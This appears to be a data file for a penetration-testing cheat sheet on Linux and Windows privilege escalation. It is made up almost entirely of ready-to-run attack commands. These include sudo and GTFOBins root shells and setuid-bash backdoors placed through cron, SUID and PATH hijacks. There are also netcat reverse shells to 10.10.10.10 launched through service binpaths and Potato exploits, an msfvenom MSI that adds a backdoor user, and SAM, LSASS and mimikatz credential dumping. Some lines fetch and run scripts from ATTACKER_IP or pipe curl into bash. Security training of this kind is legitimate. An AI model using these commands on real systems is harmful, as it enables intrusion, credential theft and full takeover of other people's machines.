linux-enum.name: Linux Enumeration
linux-enum.description: First-pass enumeration: OS version, kernel, sudo version, installed packages, running processes, and users. Run these before anything else to understand what you're working with.

commands.name: OS and kernel info
commands.command:
(cat /proc/version || uname -a) 2>/dev/null
cat /etc/os-release 2>/dev/null
lsb_release -a 2>/dev/null
commands.note: Start here — kernel version drives exploit selection

commands.name: Current user and privileges
commands.command:
id
whoami
groups
sudo -l 2>/dev/null
commands.note: sudo -l is often the fastest path to root

commands.name: All local users
commands.command:
cat /etc/passwd | cut -d: -f1
cat /etc/passwd | grep 'sh$'
awk -F: '($3 == "0") {print}' /etc/passwd
commands.note: Find shell users and extra UID-0 accounts

commands.name: Sudo version check
commands.note: Older sudo versions (< 1.9.17p1) have known LPE CVEs

commands.name: Useful binaries on path
commands.command: which nmap aws nc ncat netcat wget curl ping gcc g++ make gdb base64 socat python python3 perl php ruby docker lxc 2>/dev/null
commands.note: Available tools shape your attack options

commands.name: Running processes
commands.command:
ps aux
ps -eo pid,ppid,user,comm,args --sort=ppid
commands.note: Look for root-owned processes with unusual paths or configs

commands.name: Installed packages
commands.command:
dpkg -l 2>/dev/null
rpm -qa 2>/dev/null
commands.note: Look for vulnerable or unusual installed software

commands.name: Kernel exploit suggester
commands.command:
uname -r
# upload linux-exploit-suggester.sh then:
bash linux-exploit-suggester.sh
commands.note: github.com/mzet-/linux-exploit-suggester — matches kernel version to known exploits

linux-sudo.name: Sudo Abuse
linux-sudo.description: sudo -l reveals what you can run as root. Even restricted commands often have GTFOBins escapes. Also covers NOPASSWD, env_keep, LD_PRELOAD, SETENV, and wildcards.

commands.name: Check sudo permissions
commands.command: sudo -l
commands.note: First thing to run — NOPASSWD entries are instant wins

commands.name: GTFOBins shell escape examples
commands.command:
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo vim -c '!sh'
sudo less /etc/passwd   # then press: ! /bin/bash
sudo python3 -c 'import pty;pty.spawn("/bin/bash")'
commands.note: Full list: gtfobins.github.io — check every allowed binary

commands.name: LD_PRELOAD escalation (env_keep)
commands.note: Only works when sudoers has 'Defaults env_keep+=LD_PRELOAD'

commands.name: SETENV / PYTHONPATH hijack
commands.command:
# Check: sudo -l shows SETENV on a Python script
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
commands.note: Drop a malicious module in /dev/shm matching what the script imports

commands.name: PATH hijack via env_keep+=PATH
commands.command:
# sudo -l shows env_keep+=PATH
mkdir -p ~/bin
cat > ~/bin/free << 'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
export PATH=~/bin:$PATH
sudo /usr/local/bin/system_status.sh  # calls 'free' relative
bash -p
commands.note: Any sudo-allowed script that calls commands by relative name is vulnerable

commands.name: sudo < v1.8.28 (negative UID)
commands.command: sudo -u#-1 /bin/bash
commands.note: Works on sudo < 1.8.28 — uid -1 resolves to UID 0

linux-suid.name: SUID/SGID Abuse
linux-suid.full_name: Linux SUID and SGID Binary Exploitation
linux-suid.description: SUID/SGID binaries run with the file owner's privileges regardless of who executes them. Find unusual ones and check GTFOBins — many common binaries have known shell escapes.

commands.name: Find all SUID binaries
commands.command:
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
commands.note: Compare against standard list — non-standard ones are targets

commands.name: Find all SGID binaries
commands.command: find / -perm -2000 -type f 2>/dev/null
commands.note: Less common than SUID but worth checking

commands.name: Check SUID for .so injection
commands.command: strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
commands.note: ENOENT on a .so means you can plant it at that path

commands.name: Inject .so into SUID binary
commands.note: Place .so at the ENOENT path found by strace

commands.name: Writable SUID wrapper script
commands.command:
# Check if SUID binary calls a script:
strings /path/to/suid_binary | grep -E '/bin/bash|\.sh'
ls -l /usr/local/bin/backup.sh
# If writable:
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/path/to/suid_wrapper
/var/tmp/rootbash -p
commands.note: Common in custom 'backup' or 'maintenance' wrappers in /usr/local/bin

commands.name: SUID PATH hijack (no absolute path in binary)
commands.command:
export PATH=/tmp:$PATH
# Put backdoor named after the called command in /tmp
sudo less  # or ./suid_binary
commands.note: Use 'strings' on the binary to find relative command calls

linux-cron.name: Cron Job Abuse
linux-cron.full_name: Linux Scheduled Task and Cron Job Exploitation
linux-cron.description: Root-owned cron jobs that call writable scripts, use wildcard expansion, or run from attacker-writable directories are reliable privesc paths. Use pspy to discover jobs not visible in crontab.

commands.name: Enumerate cron jobs
commands.command:
crontab -l
ls -al /etc/cron* /etc/at* 2>/dev/null
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
systemctl list-timers --all
commands.note: Check both user crontab and system-wide cron directories

commands.name: Monitor processes for hidden cron jobs (pspy)
commands.command:
# Upload pspy (github.com/DominicBreuker/pspy) then:
chmod +x pspy64; ./pspy64
commands.note: Shows processes started by root even without root access to crontab

commands.name: Overwrite writable cron script
commands.command:
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /PATH/TO/CRON/SCRIPT
# Wait for cron to run it
/tmp/bash -p
commands.note: If root cron calls a script you can write, you get root on next execution

commands.name: Cron PATH hijack
commands.command:
# /etc/crontab has PATH=/home/user:/usr/local/sbin:...
# and runs: * * * * * root overwrite.sh (no absolute path)
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
chmod +x /home/user/overwrite.sh
# Wait for cron, then:
/tmp/bash -p
commands.note: Check crontab PATH and see if any job runs commands without full path

commands.name: Wildcard injection in cron script
commands.command:
# Script runs: tar czf backup.tar.gz /home/user/*
# Create files with flag-like names in the target dir:
touch /home/user/--checkpoint=1
touch "/home/user/--checkpoint-action=exec=sh shell.sh"
echo '#!/bin/bash\ncp /bin/bash /tmp/b && chmod +s /tmp/b' > /home/user/shell.sh
chmod +x /home/user/shell.sh
commands.note: Works when wildcard (*) expands in a directory you control

commands.name: pspy slow poll (monitor every 0.1s for 1 min)
commands.command:
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done
sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"
rm /tmp/monprocs.tmp
commands.note: Manual fallback when pspy binary isn't available

linux-capabilities.name: Linux Capabilities
linux-capabilities.full_name: Linux Capability Abuse for Privilege Escalation
linux-capabilities.description: Linux capabilities split root privileges into fine-grained units. Binaries with dangerous capabilities (cap_setuid, cap_net_raw, cap_dac_read_search) can be abused to escalate without SUID.

commands.name: Find binaries with capabilities
commands.command: getcap -r / 2>/dev/null
commands.note: Look for cap_setuid+ep, cap_dac_read_search+ep, cap_net_raw+ep

commands.name: Check current process capabilities
commands.command:
cat /proc/self/status | grep Cap
capsh --decode=$(cat /proc/self/status | grep CapEff | awk '{print $2}')
commands.note: CapEff = currently active capabilities

commands.name: cap_setuid abuse (python example)
commands.command:
# If python3 has cap_setuid+ep:
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
commands.note: Any binary with cap_setuid can set UID to 0

commands.name: cap_setuid abuse (ruby, perl)
commands.command:
ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'
perl -e 'POSIX::setuid(0); exec "/bin/bash";'

commands.name: cap_dac_read_search abuse (read any file)
commands.command:
# Compile and use tar to read shadow:
# Or use python with this cap to read /etc/shadow, /root/.ssh/id_rsa etc.
python3 -c "print(open('/etc/shadow').read())"
commands.note: Bypasses DAC read checks — can read any file including /etc/shadow

commands.name: cap_net_raw (packet sniffing → credentials)
commands.command: tcpdump -i any -A -s0 'port 21 or port 23 or port 110 or port 143' 2>/dev/null
commands.note: Sniff cleartext creds from FTP/Telnet/POP/IMAP if network active

linux-services.name: Linux Service Misconfigs
linux-services.full_name: Linux systemd Service and Socket Misconfiguration
linux-services.description: Writable .service files, writable service binaries, relative paths in ExecStart, and missing socket-activated services all allow code execution as root when the service triggers.

commands.name: Find writable .service files
commands.command:
find /etc/systemd /lib/systemd /usr/lib/systemd -name '*.service' -writable 2>/dev/null
ls -la /etc/systemd/system/
commands.note: Add ExecStart=/tmp/backdoor.sh to a writable service and wait for restart

commands.name: Find writable service binaries
commands.command:
# Extract ExecStart paths from all services and check write perms:
grep -r 'ExecStart=' /etc/systemd/system/ /lib/systemd/system/ 2>/dev/null | grep -v '#' | awk -F'=' '{print $2}' | awk '{print $1}' | sort -u | xargs -I{} ls -la {} 2>/dev/null
commands.note: Writable ExecStart binary = root execution on next service start/restart

commands.name: Check systemd PATH for relative ExecStart
commands.command:
systemctl show-environment
grep -r 'ExecStart=' /etc/systemd/system/ /lib/systemd/system/ 2>/dev/null | grep -v '/' | grep -v '#'
commands.note: Relative ExecStart paths are resolved via systemd's PATH — plant binary if writable

commands.name: Enumerate socket-activated services
commands.command:
systemctl list-sockets --all
find /etc/systemd /lib/systemd -name '*.socket' 2>/dev/null | xargs grep -l 'Service=' 2>/dev/null
commands.note: Check if referenced .service file is missing and you can create it

commands.name: List all timers
commands.command: systemctl list-timers --all
commands.note: Timers are like cron — check if the activated unit is writable

commands.name: Find writable Unix sockets
commands.command:
find / -type s 2>/dev/null
ss -xlp 2>/dev/null
netstat -xln 2>/dev/null
commands.note: World-writable sockets on privileged services are dangerous

linux-writable.name: Writable Paths
linux-writable.full_name: Linux Writable Files, Directories, and PATH Hijacking
linux-writable.description: World-writable or group-writable files/directories owned by root, writable PATH entries, and write access to /etc are all potential escalation paths.

commands.name: Find world-writable files (not in /proc)
commands.command: find / -writable -not -path '/proc/*' -not -path '/sys/*' -type f 2>/dev/null | grep -v 'snap'
commands.note: Focus on files owned by root or executed as root

commands.name: Find world-writable directories
commands.command: find / -writable -not -path '/proc/*' -not -path '/sys/*' -type d 2>/dev/null
commands.note: Writable dir in PATH or containing executed scripts = hijack

commands.name: Check PATH for writable entries
commands.command: echo $PATH | tr ':' '\n' | xargs -I{} ls -ld {} 2>/dev/null
commands.note: If any PATH dir is writable, drop a trojan named after a common command

commands.name: Find files recently modified by root
commands.command: find / -newer /tmp -user root -writable 2>/dev/null | grep -v '^/proc\|^/sys'
commands.note: Correlate with active cron or service to find what's being executed

commands.name: Check NFS mounts (no_root_squash)
commands.command:
cat /etc/exports
mountd --exports 2>/dev/null
showmount -e localhost 2>/dev/null
commands.note: no_root_squash allows attacker to create SUID binaries from their own root

commands.name: Exploit NFS no_root_squash
commands.command:
# From attacker machine (as root), mount the share:
mount -t nfs <TARGET_IP>:/share /mnt/nfs
cp /bin/bash /mnt/nfs/
chmod +s /mnt/nfs/bash
# On target:
/tmp/bash -p
commands.note: Requires access to a machine with root to mount and create SUID files

linpeas.name: LinPEAS
linpeas.description: LinPEAS is the go-to automated Linux privesc enumeration tool. It color-codes findings by severity and covers nearly every privesc vector. Always run it first on a new box.

commands.name: Run LinPEAS from URL (curl)
commands.command: curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
commands.note: Requires outbound HTTP — check egress first

commands.name: Run LinPEAS from memory (no disk write)
commands.command: curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash
commands.note: Pipes directly to bash — no artifact on disk

commands.name: Transfer and run LinPEAS
commands.command:
# On attacker:
python3 -m http.server 8080
# On target:
wget http://<ATTACKER_IP>:8080/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh 2>/dev/null | tee /tmp/out.txt
commands.note: Save output to file — LinPEAS produces a lot of data

commands.name: pspy (process monitor without root)
commands.command:
# Upload pspy64 from github.com/DominicBreuker/pspy/releases
chmod +x pspy64 && ./pspy64
commands.note: Reveals root cron jobs and processes invisible in standard ps

windows-enum.name: Windows Enumeration
windows-enum.full_name: Windows System Information and User Enumeration
windows-enum.description: Initial Windows enumeration: OS version, patches, users, groups, environment, PowerShell history, and credentials in common locations.

commands.name: System info and patch level
commands.command:
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
wmic qfe get Caption,Description,HotFixID,InstalledOn
commands.note: Patch level determines which kernel exploits apply

commands.name: Current user and privileges
commands.command:
whoami
whoami /all
net users %username%
net localgroup Administrators
commands.note: whoami /all shows all token privileges — SeImpersonate is your best friend

commands.name: All local users and groups
commands.command:
net users
net localgroup
Get-LocalUser | ft Name,Enabled,LastLogon
Get-LocalGroupMember Administrators | ft Name, PrincipalSource

commands.name: Environment variables (credential hunting)
commands.command:
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
commands.note: Credentials and API keys are sometimes stored in env vars

commands.name: PowerShell command history
commands.command:
type %USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
commands.note: Often contains cleartext passwords and commands run as admin

commands.name: Running processes
commands.command:
Tasklist /SVC
tasklist /v /fi "username eq system"
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize
commands.note: Look for processes running as SYSTEM with unusual paths

commands.name: Open ports / listening services
commands.command:
netstat -ano
netstat -ano | findstr LISTENING
Get-NetTCPConnection -State Listen | Select LocalPort, OwningProcess | Sort LocalPort
commands.note: Internal-only ports often expose services with higher privileges

commands.name: Check AlwaysInstallElevated
commands.command:
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
commands.note: Both must be 0x1 — if so, any MSI runs as SYSTEM

windows-services.name: Windows Service Abuse
windows-services.description: Weak service permissions, writable service binaries, unquoted service paths, and modifiable registry keys all allow code execution as SYSTEM through service manipulation.

commands.name: List all services
commands.command:
net start
wmic service list brief
sc query
Get-Service

commands.name: Check service permissions (accesschk)
commands.command:
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
commands.note: Download from Sysinternals — look for SERVICE_ALL_ACCESS or SERVICE_CHANGE_CONFIG

commands.name: Unquoted service paths
commands.command:
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'
commands.note: C:\Program Files\Some App\svc.exe → plant C:\Program.exe

commands.name: Modify service binary path
commands.command:
# If you have SERVICE_ALL_ACCESS or SERVICE_CHANGE_CONFIG:
sc config <ServiceName> binpath= "C:\temp\nc.exe -nv 127.0.0.1 4444 -e C:\WINDOWS\System32\cmd.exe"
net stop <ServiceName> && net start <ServiceName>
commands.note: Requires ability to stop/start the service or a reboot

commands.name: Check writable service binaries
commands.command:
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt
for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\\"
commands.note: Replace writable binary with payload and restart service

commands.name: Check service registry permissions
commands.command:
reg query hklm\System\CurrentControlSet\Services /s /v imagepath
get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
commands.note: Writable HKLM service key = change ImagePath to payload

commands.name: Modify service via registry
commands.command:
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d "C:\temp\payload.exe" /f
net start <service_name>
commands.note: Use when you have registry write but not sc service_change_config

windows-tokens.name: Windows Token Abuse
windows-tokens.description: Token privileges like SeImpersonatePrivilege (held by service accounts) allow escalation to SYSTEM via potato-family exploits. Check whoami /all — SeImpersonate is an almost-guaranteed SYSTEM.

commands.name: Check current token privileges
commands.command:
whoami /all
whoami /priv
commands.note: SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege = likely SYSTEM via Potato

commands.name: PrintSpoofer (SeImpersonate → SYSTEM)
commands.command:
PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -c "C:\temp\nc.exe -e cmd 10.10.10.10 4444"
commands.note: Works on Windows 10/2016/2019 with SeImpersonatePrivilege — github.com/itm4n/PrintSpoofer

commands.name: GodPotato (modern universal potato)
commands.command:
GodPotato.exe -cmd "cmd /c whoami > C:\temp\out.txt"
GodPotato.exe -cmd "C:\temp\nc.exe -e cmd 10.10.10.10 4444"
commands.note: Supports Windows 2012–2022; requires SeImpersonatePrivilege — github.com/BeichenDream/GodPotato

commands.name: JuicyPotato (older Windows, SeImpersonate)
commands.command: JuicyPotato.exe -l 1337 -p C:\temp\nc.exe -a "-e cmd 10.10.10.10 4444" -t *
commands.note: Windows 7–2016; requires CLSID matching OS version — github.com/ohpe/juicy-potato

commands.name: SeBackupPrivilege — dump SAM/SYSTEM
commands.command:
# Backup SAM and SYSTEM registry hives:
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
# Extract hashes offline:
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
commands.note: SeBackupPrivilege bypasses ACL on registry hives

commands.name: SeRestorePrivilege — overwrite any file
commands.command:
# Can overwrite files regardless of ACL:
# Replace utilman.exe with cmd.exe for accessibility LPE:
copy /b C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
commands.note: Use with Backup Operators group — see HackTricks privileged groups page

windows-registry.name: Windows Registry Privesc
windows-registry.description: AlwaysInstallElevated MSI installs, AutoRun keys, WDigest credential caching, and LSA protection settings — registry checks that regularly yield privesc on misconfigured systems.

commands.name: AlwaysInstallElevated check and exploit
commands.command:
# Check:
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# Exploit (create SYSTEM-executed MSI):
msfvenom -p windows/adduser USER=backdoor PASS=P@ss123! -f msi -o /tmp/pwn.msi
msiexec /quiet /qn /i C:\temp\pwn.msi
commands.note: Both registry keys must be 0x1 — extremely common misconfiguration

commands.name: AutoRun executables
commands.command:
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
commands.note: Writable AutoRun binary = code exec on next logon/reboot

commands.name: Check WDigest (cleartext creds in LSASS)
commands.command: reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
commands.note: Value 1 = cleartext passwords cached in LSASS memory

commands.name: Check LSA Protection and Credential Guard
commands.command:
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL
reg query HKLM\System\CurrentControlSet\Control\LSA /v LsaCfgFlags
commands.note: LSA protection and Credential Guard block credential dumping

commands.name: WSUS non-SSL (CVE-2020-1013)
commands.command:
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
commands.note: HTTP (not HTTPS) WSUS = MITM update injection → SYSTEM

commands.name: Startup folder executables
commands.command:
dir "C:\Users\All Users\Microsoft\Windows\Start Menu\Programs\Startup"
dir "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
commands.note: Writable startup items run on next logon

windows-credentials.name: Windows Credential Hunting
windows-credentials.full_name: Windows Stored Credential and Password Discovery
windows-credentials.description: SAM database, LSASS memory, credential manager, PowerShell history, unattend files, registry, and common config files regularly contain cleartext or crackable credentials.

commands.name: SAM and SYSTEM hive backup
commands.command:
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
reg save HKLM\SECURITY C:\temp\SECURITY
# Extract offline:
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
commands.note: Requires SeBackupPrivilege or local admin — extracts NTLM hashes

commands.name: Check SAM backup files
commands.command:
dir /b /s C:\Windows\repair\sam 2>nul
dir /b /s C:\Windows\System32\config\RegBack\SAM 2>nul
commands.note: Backup SAM files are sometimes readable without admin rights

commands.name: Search for passwords in common files
commands.command:
findstr /si password *.xml *.ini *.txt 2>nul
findstr /si pass *.config 2>nul
dir /s /b *sysprep.inf *sysprep.xml *unattend.xml *unattended.xml 2>nul
commands.note: Unattend.xml from Windows deployments often has admin creds

commands.name: Windows Credential Manager
commands.command:
cmdkey /list
vaultcmd /listcreds:"Windows Credentials" /all
# Dump with mimikatz:
dpapi::cred /in:%APPDATA%\Microsoft\Credentials\<GUID>
commands.note: Stored RDP, network share, and web credentials

commands.name: Winlogon stored credentials
commands.command:
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
commands.note: Auto-logon configurations often store cleartext passwords

commands.name: WiFi stored passwords
commands.command:
netsh wlan show profiles
netsh wlan show profile name="<PROFILE>" key=clear
commands.note: Each network profile may contain a cleartext key

winpeas.name: WinPEAS
winpeas.description: WinPEAS is the primary automated Windows privesc enumeration tool. Color-codes findings by severity. Run it immediately after initial access — it covers services, tokens, credentials, registry, and more.

commands.name: Run WinPEAS (all checks)
commands.command:
winpeas.exe
winpeas.exe quiet cmd fast
commands.note: Download from github.com/carlospolop/PEASS-ng/releases — run as low-priv user

commands.name: Transfer WinPEAS via PowerShell
commands.command:
# On attacker:
python3 -m http.server 8080
# On target:
(New-Object Net.WebClient).DownloadFile('http://<ATTACKER_IP>:8080/winpeas.exe', 'C:\temp\winpeas.exe')
C:\temp\winpeas.exe | Out-File C:\temp\out.txt
